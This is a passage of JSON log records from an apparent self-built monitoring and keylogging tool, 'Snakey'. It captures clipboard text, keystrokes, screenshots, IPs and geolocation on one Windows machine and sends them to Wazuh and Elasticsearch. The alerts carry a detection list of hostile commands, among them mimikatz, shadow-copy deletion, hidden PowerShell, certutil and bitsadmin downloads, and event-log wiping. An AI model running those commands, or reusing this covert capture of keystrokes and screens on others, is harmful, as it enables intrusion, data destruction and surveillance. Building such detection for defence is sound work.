exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session() # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "86dc640ab69e27f80283816c14c3cffc18a1247e9232f2adeb70c6d530504d30", "screenshot_hash": "03c5ff8e535232fcaad155e5fa82c0c8a18f6b0072513a10161055c5d16e64a5", "_raw_log_hash": "307dd9e21c5307f68e65e4d8e7fd3056cce5cfb15371aa9cff33371e9692235c"}
{"timestamp": "2025-06-10T17:57:32.844555", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://zgeajoabenj2nac6k5cei5qy62iu5yun5gm2vjnxy65r3p3amzykwxqd.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "VirusTotal flagged clipboard URL as malicious: 2 positives."], "virustotal": {"clipboard_url": {"malicious": 2, "suspicious": 0, "undetected": 29, "harmless": 65, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "da0e8cd72f534e39c14f8d4a5d9ac4fb7e3c6c3b240f1493cbfb4e4fce9cfb5e", "screenshot_hash": "67910b93651261abc14b4d5a65dd51473c290b4743ee46d9eb885e32aa1bbf7c", "_raw_log_hash": "4666900d63ae108a4c51318a0fa6c9cd9008954e2eebcb8164468afa2565c768"}
{"timestamp": "2025-06-10T17:58:01.682782", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://zgeajoabenj2nac6k5cei5qy62iu5yun5gm2vjnxy65r3p3amzykwxqd.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "VirusTotal flagged clipboard URL as malicious: 2 positives."], "virustotal": {"clipboard_url": {"malicious": 2, "suspicious": 0, "undetected": 29, "harmless": 65, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "da0e8cd72f534e39c14f8d4a5d9ac4fb7e3c6c3b240f1493cbfb4e4fce9cfb5e", "screenshot_hash": "1adf421b7fadff33567b7a29806f736daa7e371bcaaadacbae12752af1cb3020", "_raw_log_hash": "fba50c5afd21d7ee55dfc4d7bb11407257b319118277717bd903732a96c2d866"}
{"timestamp": "2025-06-10T17:58:43.913627", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://zgeajoabenj2nac6k5cei5qy62iu5yun5gm2vjnxy65r3p3amzykwxqd.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "VirusTotal flagged clipboard URL as malicious: 2 positives."], "virustotal": {"clipboard_url": {"malicious": 2, "suspicious": 0, "undetected": 29, "harmless": 65, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "da0e8cd72f534e39c14f8d4a5d9ac4fb7e3c6c3b240f1493cbfb4e4fce9cfb5e", "screenshot_hash": "22f9ea9745be94655357f5963db64f779d88fa524e69c69865351fbf61fd1956", "_raw_log_hash": "f8b6300f5fa85a1d7f1088cbe633b8999f17489c931e557b35e916a3822aec3d"}
{"timestamp": "2025-06-10T17:59:14.296695", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://zgeajoabenj2nac6k5cei5qy62iu5yun5gm2vjnxy65r3p3amzykwxqd.onion/", "keystrokes": "[ctrl_l]\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "VirusTotal flagged clipboard URL as malicious: 2 positives."], "virustotal": {"clipboard_url": {"malicious": 2, "suspicious": 0, "undetected": 29, "harmless": 65, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "da0e8cd72f534e39c14f8d4a5d9ac4fb7e3c6c3b240f1493cbfb4e4fce9cfb5e", "screenshot_hash": "557ff0414a7b1462ce914b63583c60b74c3266a6e2ac54eba016d26b162fa427", "_raw_log_hash": "d73ac12f7d2b50e7ef34bee476ede09f31c63abac8f819cb2342ca66822d688b"}
{"timestamp": "2025-06-10T18:08:04.486893", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2eaabb2b8acd6c5ba71c57bfcb5b7acedbba56e95c1e1bb34bd3b3feb4638f06", "_raw_log_hash": "51c598b7dac1b909b2ef792085f54c56c88eed42eeb186ba0264374515300db4"}
{"timestamp": "2025-06-11T13:53:18.701137", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "GET snakey_logs/_search\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup timed out."], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "b6ff984068ce6440ccc7cc5a408a4bcf36097cca9613b130f0ce131851426497", "screenshot_hash": "267d6fe5832beeba8876a9faa472aad06dfb8fc698afb283585e37910a32d342", "_raw_log_hash": "621d6f30120be55002f40a1cd81a08472f4f2755af71e9154b356a35d94c0c44"}
{"timestamp": "2025-06-11T14:07:10.418755", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "{\r\n  \"took\": 134,\r\n  \"timed_out\": false,\r\n  \"_shards\": {\r\n    \"total\": 1,\r\n    \"successful\": 1,\r\n    \"skipped\": 0,\r\n    \"failed\": 0\r\n  },\r\n  \"hits\": {\r\n    \"total\": {\r\n      \"value\": 288,\r\n      \"relation\": \"eq\"\r\n    },\r\n    \"max_score\": null,\r\n    \"hits\": [\r\n      {\r\n        \"_index\": \"snakey_logs\",\r\n        \"_id\": \"MKANX5cBYOkqrz3koFKX\",\r\n        \"_score\": null,\r\n        \"_source\": {\r\n          \"timestamp\": \"2025-06-11T13:53:18.701137\",\r\n          \"system\": {\r\n            \"username\": \"user\",\r\n            \"hostname\": \"MSI\",\r\n            \"private_ip\": \"172.20.10.2\",\r\n            \"processor\": \"Intel64 Family 6 Model 186 Stepping 2, GenuineIntel\",\r\n            \"os\": \"Windows 10.0.26100\",\r\n            \"machine\": \"AMD64\"\r\n          },\r\n          \"clipboard\": \"\"\"GET snakey_logs/_search\r\n\"\"\",\r\n          \"keystrokes\": \"\",\r\n          \"screenshot_taken\": true,\r\n          \"alerts\": [\r\n            \"IP info lookup timed out.\"\r\n          ],\r\n          \"virustotal\": {},\r\n          \"important_dirs\": {\r\n            \"Desktop\": \"Not found\",\r\n            \"Documents\": \"Found (6 items)\",\r\n            \"Downloads\": \"Found (794 items)\",\r\n            \"AppData\": \"Found (55 items)\",\r\n            \"LocalAppData\": \"Found (113 items)\"\r\n          },\r\n          \"clipboard_hash\": \"b6ff984068ce6440ccc7cc5a408a4bcf36097cca9613b130f0ce131851426497\",\r\n          \"screenshot_hash\": \"267d6fe5832beeba8876a9faa472aad06dfb8fc698afb283585e37910a32d342\",\r\n          \"_raw_log_hash\": \"621d6f30120be55002f40a1cd81a08472f4f2755af71e9154b356a35d94c0c44\"\r\n        },\r\n        \"sort\": [\r\n          1749649998701137000\r\n        ]\r\n      },", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "613d936191c821c80c33c5d24a058d5225d92014d1823b9697142220fbb58a8f", "screenshot_hash": "54c0de5a73c1d556d66a52e6faf0e390d779f0e2d726ba0be5fa7908ced7c8d8", "_raw_log_hash": "351dfba9059e46aca3b94589c8f2625ace03bc4ca9917cd0ac5c4d15b67ed3d1"}
{"timestamp": "2025-06-11T14:08:59.906651", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "{\r\n  \"took\": 134,\r\n  \"timed_out\": false,\r\n  \"_shards\": {\r\n    \"total\": 1,\r\n    \"successful\": 1,\r\n    \"skipped\": 0,\r\n    \"failed\": 0\r\n  },\r\n  \"hits\": {\r\n    \"total\": {\r\n      \"value\": 288,\r\n      \"relation\": \"eq\"\r\n    },\r\n    \"max_score\": null,\r\n    \"hits\": [\r\n      {\r\n        \"_index\": \"snakey_logs\",\r\n        \"_id\": \"MKANX5cBYOkqrz3koFKX\",\r\n        \"_score\": null,\r\n        \"_source\": {\r\n          \"timestamp\": \"2025-06-11T13:53:18.701137\",\r\n          \"system\": {\r\n            \"username\": \"user\",\r\n            \"hostname\": \"MSI\",\r\n            \"private_ip\": \"172.20.10.2\",\r\n            \"processor\": \"Intel64 Family 6 Model 186 Stepping 2, GenuineIntel\",\r\n            \"os\": \"Windows 10.0.26100\",\r\n            \"machine\": \"AMD64\"\r\n          },\r\n          \"clipboard\": \"\"\"GET snakey_logs/_search\r\n\"\"\",\r\n          \"keystrokes\": \"\",\r\n          \"screenshot_taken\": true,\r\n          \"alerts\": [\r\n            \"IP info lookup timed out.\"\r\n          ],\r\n          \"virustotal\": {},\r\n          \"important_dirs\": {\r\n            \"Desktop\": \"Not found\",\r\n            \"Documents\": \"Found (6 items)\",\r\n            \"Downloads\": \"Found (794 items)\",\r\n            \"AppData\": \"Found (55 items)\",\r\n            \"LocalAppData\": \"Found (113 items)\"\r\n          },\r\n          \"clipboard_hash\": \"b6ff984068ce6440ccc7cc5a408a4bcf36097cca9613b130f0ce131851426497\",\r\n          \"screenshot_hash\": \"267d6fe5832beeba8876a9faa472aad06dfb8fc698afb283585e37910a32d342\",\r\n          \"_raw_log_hash\": \"621d6f30120be55002f40a1cd81a08472f4f2755af71e9154b356a35d94c0c44\"\r\n        },\r\n        \"sort\": [\r\n          1749649998701137000\r\n        ]\r\n      },", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "613d936191c821c80c33c5d24a058d5225d92014d1823b9697142220fbb58a8f", "screenshot_hash": "f76253f701ed56954e62cecba33cec3a75abbcfee5981fea9d6322caac5b2d57", "_raw_log_hash": "3e16a8f5853448a3bb9e62c8a8f8f071c99d8d377637ff4d22984ee079107ec4"}
{"timestamp": "2025-06-11T13:16:15.850109+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "09af97e6f0339cb186908e660ece1f573438380d1e29b62f6472baab2067fba0", "_raw_log_hash": "72637f10038e4d7fa802e38b87559b583074a3f9e82f7c9d523dd229f0ceb4d5"}
{"timestamp": "2025-06-11T13:16:42.693998+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "d9e56d26e48f726e75d36688546871a43c645809f73cb4ebf5404ce7c126f374", "_raw_log_hash": "b6fa23ea8e3ecec161427ccb937fc23f6c6c301d7d8546019e386a91162da53b"}
{"timestamp": "2025-06-11T13:17:08.711392+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "b2345960490f8e88ce89294f695cedd048d506da81d2ac50677bb49314f9ea20", "_raw_log_hash": "0f3691e24653ba0b5f44d0b4e6a8e951e49e0bed732a449f327f7c96ae6dc1b9"}
{"timestamp": "2025-06-11T13:17:34.885628+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "stop[shift_r]_snakey[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "2ea04f675391e9e9f457e0ae9f35f30b6219c2b8ab6254e8d466be594288f681", "_raw_log_hash": "57aaf022417e9e1c1e61e6af9346125b5c3310d02e7af2bef68eeeabba4164c8"}
{"timestamp": "2025-06-11T13:23:19.344203+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "25ce7844b0fdbd897765f356d1ae27ac5ebb249fae65d48d902e1c59d92cfed6", "_raw_log_hash": "fa520edbc5184a6ea6fa54edc424573428f3382f7abf753981514feef65145ef"}
{"timestamp": "2025-06-11T13:23:49.966603+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "8797f49cf19f7dba48769cfb9b9d944b2c5592a1c1ab1c6bbcce4640011b7e01", "_raw_log_hash": "508629f021c208ddefcd4fd8e6faacb5e853e39553c2b0dae0852bab635c416b"}
{"timestamp": "2025-06-11T13:24:29.468482+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": " wiki[ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "95a5a5f15f5feb849a85419527f1ecedf3ce179888e3a4e8a00503d279e88119", "_raw_log_hash": "1f9bba11d80b16218b70b9c8e0e1f6c2c1cc57213d412839a1293afed859e170"}
{"timestamp": "2025-06-11T13:24:56.663432+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "from datetime import datetime, timezone", "keystrokes": "[ctrl_l]\u0003", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "9e89c22761b2ee75bd7b54cd47d588fd43365276dfa60ebac316185219139c99", "screenshot_hash": "22b7f3bd8136e7b6aa1751b7b2af2f2f535ffe344d3815c9d8d0af391428649f", "_raw_log_hash": "9c7cbac3d665d2ea1525f7a318bbb1703187c4908c939e7828ab7faf45a4e1cd"}
{"timestamp": "2025-06-11T13:25:24.564489+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {"clipboard_url": {"malicious": 0, "suspicious": 1, "undetected": 27, "harmless": 68, "timeout": 0}}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "58a568eb870c761e069e793d0e7865c0f74429344680f62e5d3cd7c1f1e05431", "screenshot_hash": "3f35cf15bd00c60f9a8775809ef10a4c920013f9fb852ca7b1ce6d451484adb1", "_raw_log_hash": "3909e7fe5f7da9494826d513a7799701d243b429a3d63d4e0d5c4aa1b6d4c63d"}
{"timestamp": "2025-06-11T13:31:25.139886+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "del /s /q", "keystrokes": "s", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Sensitive CMD command detected in clipboard: 'del /s /q...' (matched: 'del /s /q')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "3cb670734d7475e2c68630dd6dd28dbccf5276aa46811b5f0ec8ad3a987b255a", "screenshot_hash": "ca728a9092bea703a6a8807aad17bc7d4fb03d96438c36ed55fff6eb736dfd4f", "_raw_log_hash": "9c4abf373c76af164d6756b2df73876a906ee122551ee33a735d72678f0eb12b"}
{"timestamp": "2025-06-11T13:44:44.902345+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # <-- Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, 